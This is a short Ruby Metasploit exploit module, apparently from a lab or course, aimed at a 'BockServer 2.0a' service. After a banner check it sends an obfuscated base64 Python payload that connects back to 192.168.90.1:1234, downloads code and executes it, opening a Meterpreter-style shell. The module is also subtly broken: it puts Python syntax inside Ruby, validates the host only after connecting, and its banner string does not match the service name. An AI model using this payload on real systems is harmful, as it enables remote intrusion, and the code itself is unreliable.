require 'socket'

class MetasploitModule < Msf::Exploit

    def initialize
        super(
            'Name'           => 'BockServer 2.0a Exploiter',
            'Description'    => 'This module can exploit BockServer 2.0a, creating a meterpreter shell.',
            'DefaultOptions' => { 'RPORT' => 3285 }
            )

        register_options(
            [
              OptString.new('RHOST', [ true, 'Set a remote host' ]),
	      OptString.new('RPORT', [ true, 'Set a remote port' ])
            ], self.class)
    end

    def run_host(ip)
        s = TCPSocket.open( rhost, rport)
    
        if rhost is None or rport is None
            print_error("rhost or rport is not properly configured")
            return
        end
        line = s.gets
        if not (line =~ /BockServe 2.0a/)
            print_error("This is not BockServe 2.0a")
            return
	end
        s.send("view")
        s.gets
        s.send("yes")
        s.gets
        s.send("import base64; exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTkyLjE2OC45MC4xJywxMjM0KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CglkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsncyc6c30pCg=='))")
        print_status("A meterpreter shell is active.")
    end
end

